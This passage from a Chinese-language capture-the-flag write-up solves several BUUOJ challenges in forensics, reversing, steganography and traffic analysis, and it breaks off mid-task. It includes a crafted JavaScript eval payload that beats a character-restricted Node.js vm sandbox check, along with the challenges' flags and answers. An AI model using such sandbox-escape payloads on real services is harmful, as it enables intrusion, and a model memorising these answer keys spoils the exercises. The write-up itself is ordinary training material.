class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">3</span>], [<span class="number">120</span>], [<span class="number">120</span>]]</span><br><span class="line">img = PIL.Image.new(<span class="string">&quot;RGB&quot;</span>, (<span class="number">120</span>, <span class="number">35</span>), <span class="string">&quot;white&quot;</span>)</span><br><span class="line"></span><br><span class="line">column, row = <span class="number">0</span>, <span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> pixelLine <span class="keyword">in</span> pixels:</span><br><span class="line">    <span class="keyword">for</span> pixel <span class="keyword">in</span> pixelLine:</span><br><span class="line">        <span class="keyword">if</span> pixel &gt; <span class="number">1</span>:</span><br><span class="line">            column += pixel</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            img.putpixel((<span class="built_in">int</span>(column), <span class="built_in">int</span>(row)), (<span class="number">16</span>, <span class="number">63</span>, <span class="number">145</span>))</span><br><span class="line">            column += <span class="number">1</span></span><br><span class="line">    row += <span class="number">1</span></span><br><span class="line">    column = <span class="number">0</span></span><br><span class="line"></span><br><span class="line">img.save(<span class="string">&quot;result.png&quot;</span>)</span><br></pre></td></tr></table></figure><p>运行脚本可以得到如下图片。</p><p><img src="https://butter.lumosary.workers.dev/images/archive/4df72543-170c-4dff-a021-5bc0cff9f636/1618575459372.a2b83c35d6d56a65ce6295a7f805dac141f8fe08.png"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Flag&#123;93ids_sk23a_p1o23&#125;</span><br></pre></td></tr></table></figure><h3 id="NPUCTF2020-回收站"><a href="#NPUCTF2020-回收站" class="headerlink" title="[NPUCTF2020]回收站"></a>[NPUCTF2020]回收站</h3><p>AccessData FTK Imager 挂载附件给出的磁盘，在 <code>X:\Windows\Web\Wallpaper\Windows</code> 下可以找到 flag。除此之外，回收站内也有部分 flag 但是并不完整。</p><p><img src="https://butter.lumosary.workers.dev/images/archive/4df72543-170c-4dff-a021-5bc0cff9f636/1618662295762.4d0b2761731eb998e3b34261333b8d9ac08be468.png"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;e10adc3949ba59abbe56e057f20f883e&#125;</span><br></pre></td></tr></table></figure><h3 id="INSHack2018-42-tar-xz"><a href="#INSHack2018-42-tar-xz" class="headerlink" title="[INSHack2018]42.tar.xz"></a>[INSHack2018]42.tar.xz</h3><p>套娃解压压缩包即可得到 flag。</p><p><img src="https://butter.lumosary.workers.dev/images/archive/4df72543-170c-4dff-a021-5bc0cff9f636/1618671289024.b2b2d57eda92a084a56ba7b0e71d0bf1eb2c4e68.png"></p><p>也可以脚本一把梭。</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">while</span> [ <span class="string">&quot;`find . -type f -name &#x27;*.tar.xz&#x27; | wc -l`&quot;</span> -gt 0 ]; </span><br><span class="line"><span class="keyword">do</span> find -<span class="built_in">type</span> f -name <span class="string">&quot;*.tar.xz&quot;</span> -<span class="built_in">exec</span> tar xf <span class="string">&#x27;&#123;&#125;&#x27;</span> \; -<span class="built_in">exec</span> rm -- <span class="string">&#x27;&#123;&#125;&#x27;</span> \;; </span><br><span class="line"><span class="keyword">done</span>;</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">INSA&#123;04ebb0d6a87f9771f2eea4dce5b91a85e7623c13301a8007914085a91b3ca6d9&#125;</span><br></pre></td></tr></table></figure><h3 id="SWPU2019-Android1"><a href="#SWPU2019-Android1" class="headerlink" title="[SWPU2019]Android1"></a>[SWPU2019]Android1</h3><p>解压文件之后发现一个库，使用 IDA 打开可以发现四个奇怪的函数，其代码整理后如下。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">char</span> *<span class="title">aa</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> *result; <span class="comment">// rax</span></span><br><span class="line">  <span class="keyword">signed</span> <span class="keyword">int</span> i; <span class="comment">// [rsp+Ch] [rbp-14h]</span></span><br><span class="line">  <span class="keyword">char</span> v2[<span class="number">3</span>]; <span class="comment">// [rsp+11h] [rbp-Fh]</span></span><br><span class="line">  <span class="keyword">int</span> v3; <span class="comment">// [rsp+14h] [rbp-Ch]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v4; <span class="comment">// [rsp+18h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v4 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  v3 = &#x27;R_C&#x27;;</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; <span class="number">3</span>; ++i )</span><br><span class="line">    v2[i] = *((_BYTE *)&amp;v3 + i) ^ <span class="number">0x37</span>;</span><br><span class="line">  result = v2;</span><br><span class="line">  <span class="keyword">if</span> ( __readfsqword(<span class="number">0x28</span>u) == v4 )</span><br><span class="line">    result = v2;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">char</span> *<span class="title">aA</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> *result; <span class="comment">// rax</span></span><br><span class="line">  <span class="keyword">signed</span> <span class="keyword">int</span> i; <span class="comment">// [rsp+Ch] [rbp-14h]</span></span><br><span class="line">  <span class="keyword">char</span> v2[<span class="number">3</span>]; <span class="comment">// [rsp+11h] [rbp-Fh]</span></span><br><span class="line">  <span class="keyword">int</span> v3; <span class="comment">// [rsp+14h] [rbp-Ch]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v4; <span class="comment">// [rsp+18h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v4 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  v3 = &#x27;AVE&#x27;;</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; <span class="number">3</span>; ++i )</span><br><span class="line">    v2[i] = *((_BYTE *)&amp;v3 + i) ^ <span class="number">0x24</span>;</span><br><span class="line">  result = v2;</span><br><span class="line">  <span class="keyword">if</span> ( __readfsqword(<span class="number">0x28</span>u) == v4 )</span><br><span class="line">    result = v2;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">char</span> *<span class="title">Aa</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> *result; <span class="comment">// rax</span></span><br><span class="line">  <span class="keyword">signed</span> <span class="keyword">int</span> i; <span class="comment">// [rsp+Ch] [rbp-14h]</span></span><br><span class="line">  <span class="keyword">char</span> v2[<span class="number">3</span>]; <span class="comment">// [rsp+11h] [rbp-Fh]</span></span><br><span class="line">  <span class="keyword">int</span> v3; <span class="comment">// [rsp+14h] [rbp-Ch]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v4; <span class="comment">// [rsp+18h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v4 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  v3 = &#x27;MWa&#x27;;</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; <span class="number">3</span>; ++i )</span><br><span class="line">    v2[i] = *((_BYTE *)&amp;v3 + i) ^ <span class="number">0x38</span>;</span><br><span class="line">  result = v2;</span><br><span class="line">  <span class="keyword">if</span> ( __readfsqword(<span class="number">0x28</span>u) == v4 )</span><br><span class="line">    result = v2;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">char</span> *<span class="title">AA</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> *result; <span class="comment">// rax</span></span><br><span class="line">  <span class="keyword">signed</span> <span class="keyword">int</span> i; <span class="comment">// [rsp+Ch] [rbp-14h]</span></span><br><span class="line">  <span class="keyword">char</span> v2[<span class="number">3</span>]; <span class="comment">// [rsp+10h] [rbp-10h]</span></span><br><span class="line">  <span class="keyword">int</span> v3; <span class="comment">// [rsp+13h] [rbp-Dh]</span></span><br><span class="line">  <span class="keyword">char</span> v4; <span class="comment">// [rsp+17h] [rbp-9h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v5; <span class="comment">// [rsp+18h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v5 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  v3 = &#x27;#$D5&#x27;;</span><br><span class="line">  v4 = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; <span class="number">4</span>; ++i )</span><br><span class="line">    v2[i] = *((_BYTE *)&amp;v3 + i) ^ <span class="number">0x77</span>;</span><br><span class="line">  result = v2;</span><br><span class="line">  <span class="keyword">if</span> ( __readfsqword(<span class="number">0x28</span>u) == v5 )</span><br><span class="line">    result = v2;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>写个脚本跑出结果。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="built_in">string</span> aa = <span class="string">&quot;R_C&quot;</span>; <span class="comment">//0x37</span></span><br><span class="line">    <span class="built_in">string</span> aA = <span class="string">&quot;AVE&quot;</span>; <span class="comment">//0x24</span></span><br><span class="line">    <span class="built_in">string</span> Aa = <span class="string">&quot;MWa&quot;</span>; <span class="comment">//0x38</span></span><br><span class="line">    <span class="built_in">string</span> AA = <span class="string">&quot;#$D5&quot;</span>; <span class="comment">//0x77</span></span><br><span class="line">    <span class="built_in">string</span> result = <span class="string">&quot;&quot;</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">char</span> c : AA)&#123;</span><br><span class="line">        result += c ^ <span class="number">0x77</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">char</span> c : aa)&#123;</span><br><span class="line">        result += c ^ <span class="number">0x37</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">char</span> c : aA)&#123;</span><br><span class="line">        result += c ^ <span class="number">0x24</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">char</span> c : Aa)&#123;</span><br><span class="line">        result += c ^ <span class="number">0x38</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    reverse(result.begin(),result.end());</span><br><span class="line">    <span class="built_in">cout</span> &lt;&lt; result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>得到 flag。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;YouaretheB3ST&#125;</span><br></pre></td></tr></table></figure><h3 id="BSidesSF2020-toast-clicker1"><a href="#BSidesSF2020-toast-clicker1" class="headerlink" title="[BSidesSF2020]toast-clicker1"></a>[BSidesSF2020]toast-clicker1</h3><p>使用 jadx 反编译附件可得到如下代码。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span>[] input = &#123;<span class="number">67</span>, <span class="number">83</span>, <span class="number">68</span>, <span class="number">120</span>, <span class="number">62</span>, <span class="number">109</span>, <span class="number">95</span>, <span class="number">90</span>, <span class="number">92</span>, <span class="number">112</span>, <span class="number">85</span>, <span class="number">73</span>, <span class="number">99</span>, <span class="number">82</span>, <span class="number">53</span>, <span class="number">99</span>, <span class="number">101</span>, <span class="number">92</span>, <span class="number">80</span>, <span class="number">89</span>, <span class="number">81</span>, <span class="number">104</span>&#125;;</span><br><span class="line"><span class="function"><span class="keyword">public</span> String <span class="title">printfirstFlag</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    String output = BuildConfig.FLAVOR;</span><br><span class="line">    <span class="keyword">int</span> i = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span> (<span class="keyword">true</span>) &#123;</span><br><span class="line">        <span class="keyword">int</span>[] iArr = <span class="keyword">this</span>.input;</span><br><span class="line">        <span class="keyword">if</span> (i &gt;= iArr.length) &#123;</span><br><span class="line">            <span class="keyword">return</span> output;</span><br><span class="line">        &#125;</span><br><span class="line">        output = output + Character.toString((<span class="keyword">char</span>) (iArr[i] + i));</span><br><span class="line">        i++;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>写个脚本把上述代码复刻一遍，得到 flag。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">input</span> = [<span class="number">67</span>, <span class="number">83</span>, <span class="number">68</span>, <span class="number">120</span>, <span class="number">62</span>, <span class="number">109</span>, <span class="number">95</span>, <span class="number">90</span>, <span class="number">92</span>, <span class="number">112</span>, <span class="number">85</span>, <span class="number">73</span>, <span class="number">99</span>, <span class="number">82</span>, <span class="number">53</span>, <span class="number">99</span>, <span class="number">101</span>, <span class="number">92</span>, <span class="number">80</span>, <span class="number">89</span>, <span class="number">81</span>, <span class="number">104</span>]</span><br><span class="line">output = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(<span class="built_in">input</span>)):</span><br><span class="line">    output += <span class="built_in">chr</span>(x + <span class="built_in">input</span>[x])</span><br><span class="line"><span class="built_in">print</span>(output)</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">CTF&#123;Bready_To_Crumble&#125;</span><br></pre></td></tr></table></figure><h3 id="CTF2019-babyflash"><a href="#CTF2019-babyflash" class="headerlink" title="[*CTF2019]babyflash"></a>[*CTF2019]babyflash</h3><p>JPEXS Free Flash Decompiler 反编译一下 swf 文件可以得到 441 张图片，这个数量正好是 21 的平方，考虑一下是二维码。</p><p><img src="https://butter.lumosary.workers.dev/images/archive/4df72543-170c-4dff-a021-5bc0cff9f636/1619252584536.5d1200faf250cd0ba59755072ae8fd8076967fe7.png" alt="image-20210424162301782"></p><p>将所有图片文件名使用 <code>dir /b</code> 提取出来并排好序，然后使用指令 <code>for /f &quot;skip=1&quot; %%a in (files.txt) do certutil -hashfile %%a MD5&gt;&gt;md5.txt</code> 计算出图片的 MD5。补全第一个图片的 MD5 后整理可得如下内容。</p><figure class="highlight plain"><figcaption><span>text</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">111111100110001111111100000100111001000001101110101011001011101101110100100101011101101110100101101011101100000100110001000001111111101010101111111000000001010100000000111011111011111000100110110011011101111011101101111001101111011010010001100000000011111010100000100011000000000001011100110011111111101011100110101100000101101000100010101110101011011000001101110100101101110000101110101101110110001100000101011100010010111111101101100001011</span><br></pre></td></tr></table></figure><p>可使用如下 receipt 得到前半段 flag。</p><figure class="highlight plain"><figcaption><span>text</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Find_&#x2F;_Replace(&#123;&#39;option&#39;:&#39;Regex&#39;,&#39;string&#39;:&#39;0&#39;&#125;,&#39;\\xFF&#39;,true,false,true,false)</span><br><span class="line">Find_&#x2F;_Replace(&#123;&#39;option&#39;:&#39;Regex&#39;,&#39;string&#39;:&#39;1&#39;&#125;,&#39;\\x00&#39;,true,false,true,false)</span><br><span class="line">Generate_Image(&#39;Greyscale&#39;,12,21)</span><br><span class="line">Parse_QR_Code(false)</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">*ctf&#123;half_flag_&amp;</span><br></pre></td></tr></table></figure><p>将 swf 文件中的音频也导出，使用 Audition 打开后可看到如下内容。</p><p><img src="https://butter.lumosary.workers.dev/images/archive/4df72543-170c-4dff-a021-5bc0cff9f636/1619254490264.cd2f0825de3b355b40503d04ad10850c9413471b.png"></p><p>得到 flag。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">*ctf&#123;half_flag_&amp;&amp;_the_rest&#125;</span><br></pre></td></tr></table></figure><figure class="highlight diff"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="deletion">- *ctf&#123;half_flag_&amp;&amp;_the_rest&#125; // original</span></span><br><span class="line"><span class="addition">+ flag&#123;halfflag&amp;&amp;_the_rest&#125; // flag for BUUOJ</span></span><br></pre></td></tr></table></figure><h3 id="INSHack2018-GCorp-Stage-1"><a href="#INSHack2018-GCorp-Stage-1" class="headerlink" title="[INSHack2018]GCorp - Stage 1"></a>[INSHack2018]GCorp - Stage 1</h3><p>使用 Wireshark 分析流量包，跟踪 TCP 流，可以在最后找到如下信息。</p><p><img src="https://butter.lumosary.workers.dev/images/archive/4df72543-170c-4dff-a021-5bc0cff9f636/1619713619333.f265f6fe03e57d2bc95f9015285a3ffe0ee84e31.png"></p><figure class="highlight plain"><figcaption><span>text</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SU5TQXtjMTgwN2EwYjZkNzcxMzI3NGQ3YmYzYzY0Nzc1NjJhYzQ3NTcwZTQ1MmY3N2I3ZDIwMmI4MWUxNDkxNzJkNmE3fQ&#x3D;&#x3D;</span><br></pre></td></tr></table></figure><p>将其 Base64 解码一次即可得到 flag。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">INSA&#123;c1807a0b6d7713274d7bf3c6477562ac47570e452f77b7d202b81e149172d6a7&#125;</span><br></pre></td></tr></table></figure><h3 id="HarekazeCTF2019-A-Z"><a href="#HarekazeCTF2019-A-Z" class="headerlink" title="[HarekazeCTF2019]A_Z"></a>[HarekazeCTF2019]A_Z</h3><p><code>/source</code>  页面中可以找到如下关键代码片段。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">app.get(<span class="string">&#x27;/&#x27;</span>, <span class="function"><span class="keyword">function</span> (<span class="params">req, res, next</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">let</span> output = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">  <span class="keyword">const</span> code = req.query.code + <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">  <span class="keyword">if</span> (code &amp;&amp; code.length &lt; <span class="number">200</span> &amp;&amp; !<span class="regexp">/[^a-z().]/</span>.test(code)) &#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">      <span class="keyword">const</span> result = vm.runInNewContext(code, &#123;&#125;, &#123; <span class="attr">timeout</span>: <span class="number">500</span> &#125;);</span><br><span class="line">      <span class="keyword">if</span> (result === <span class="number">1337</span>) &#123;</span><br><span class="line">        output = process.env.FLAG;</span><br><span class="line">      &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        output = <span class="string">&#x27;nope&#x27;</span>;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125; <span class="keyword">catch</span> (e) &#123;</span><br><span class="line">      output = <span class="string">&#x27;nope&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    output = <span class="string">&#x27;nope&#x27;</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  res.render(<span class="string">&#x27;index&#x27;</span>, &#123; <span class="attr">title</span>: <span class="string">&#x27;[a-z().]&#x27;</span>, output &#125;);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p>因此关键在于如何使用限定的字符集 <code>a-z().</code> 构造出 1337 这个数。通过尝试可以发现如下几点。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">(<span class="keyword">typeof</span>(self)) <span class="comment">// object</span></span><br><span class="line">(<span class="keyword">typeof</span>(self)).constructor.length <span class="comment">// 1</span></span><br><span class="line"><span class="literal">NaN</span>.constructor.length <span class="comment">// 1</span></span><br><span class="line"><span class="literal">true</span>.constructor.length <span class="comment">// 1</span></span><br><span class="line">(<span class="keyword">typeof</span>(self)).sub.name.length <span class="comment">// 3</span></span><br><span class="line">(<span class="keyword">typeof</span>(self)).replace.name.length <span class="comment">//7</span></span><br></pre></td></tr></table></figure><p>因此可以构造出如下载荷。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">eval</span>(((<span class="keyword">typeof</span>(self)).constructor()).concat(<span class="literal">true</span>.constructor.length).concat((<span class="keyword">typeof</span>(self)).sub.name.length).concat((<span class="keyword">typeof</span>(self)).sub.name.length).concat((<span class="keyword">typeof</span>(self)).replace.name.length))</span><br></pre></td></tr></table></figure><p>将载荷提交即可得到 flag。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;8d58e39a-55b3-45b3-a0f4-c297774e4077&#125;</span><br></pre></td></tr></table></figure><h3 id="网鼎杯-2020-青龙组-虚幻2"><a href="#网鼎杯-2020-青龙组-虚幻2" class="headerlink" title="[网鼎杯 2020 青龙组]虚幻2"></a>[网鼎杯 2020 青龙组]虚幻2</h3><p>检测附件的类型可知是一张图片。</p><figure class="highlight plain"><figcaption><span>text</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">File type:   Portable Network Graphics image</span><br><span class="line">Extension:   png</span><br><span class="line">MIME type:   image&#x2F;png</span><br></pre></td></tr></table></figure><p><img src="https://butter.lumosary.workers.dev/images/archive/4df72543-170c-4dff-a021-5bc0cff9f636/1619757360271.90f7c54ea3f9a8c76011d7b2a05a17c6dbefa8bf.png"></p><p>猜测是三个颜色通道信息的叠合，同时看结构很像是汉信码。写个脚本将内容还原一下。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line"></span><br><span class="line">image = Image.<span class="built_in">open</span>(<span class="string">&#x27;file.png&#x27;</span>)</span><br><span class="line">pixels = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="number">36</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="number">12</span>):</span><br><span class="line">        pixel = image.getpixel((i, j))</span><br><span class="line">        <span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="number">3</span>):</span><br><span class="line">            pixels += (<span class="string">&#x27;1&#x27;</span> <span class="keyword">if</span> pixel[k] == <span class="number">0</span> <span class="keyword">else</span> <span class="string">&#x27;0&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(pixels)</span><br></pre></td></tr></table></figure><p>运行脚本可以得到如下内容。</p><figure class="highlight plain"><figcaption><span>text</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="linespan><br></pre></td></tr></table></figure><p>使用如下的 CyberChef Receipt 可以生成图片。</p><figure class="highlight plain"><figcaption><span>text</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Find_&#x2F;_Replace(&#123;&#39;option&#39;:&#39;Regex&#39;,&#39;string&#39;:&#39;1&#39;&#125;,&#39;\\x00&#39;,true,false,true,false)</span><br><span class="line">Find_&#x2F;_Replace(&#123;&#39;option&#39;:&#39;Regex&#39;,&#39;string&#39;:&#39;0&#39;&#125;,&#39;\\xff&#39;,true,false,true,false)</span><br><span class="line">Generate_Image(&#39;Greyscale&#39;,8,36)</span><br></pre></td></tr></table></figure><p><img src="https://butter.lumosary.workers.dev/images/archive/4df72543-170c-4dff-a021-5bc0cff9f636/1619758126695.8d3d19307f83033960293ab3218d7ba9eb7db210.png@100w"></p><p>将图片稍微处理一下，再填充一下空白处，使用汉信码的 app 扫描即可得到 flag。</p><p><img src="https://butter.lumosary.workers.dev/images/archive/4df72543-170c-4dff-a021-5bc0cff9f636/1619759293831.ffc0d6b42993834fcf636e9c42879f555fbe1408.png@100w" alt="image-20210430130813382"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;eed70c7d-e530-49ba-ad45-80fdb7872e0a&#125;</span><br></pre></td></tr></table></figure><h3 id="INSHack2019-Passthru"><a href="#INSHack2019-Passthru" class="headerlink" title="[INSHack2019]Passthru"></a>[INSHack2019]Passthru</h3><p>用 Wireshark 载入附件中的 sslkey 后分析流量包，可以发现很多含有 <code>kcahsni</code> 的请求，将其反写可得 <code>inshack</code>，因此推测其与 flag 相关。使用 tshark 将请求的参数内容取出。</p><figure class="highlight plain"><figcaption><span>text</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tshark -r capture.pcap -o &quot;tls.keylog_file:sslkey.log&quot; -Y &quot;http contains \&quot;GET &#x2F;searchbyimage\&quot;&quot; -T fields -e http.request.uri.query.parameter &gt; data.txt</span><br></pre></td></tr></table></figure><p>将取出的数据使用如下 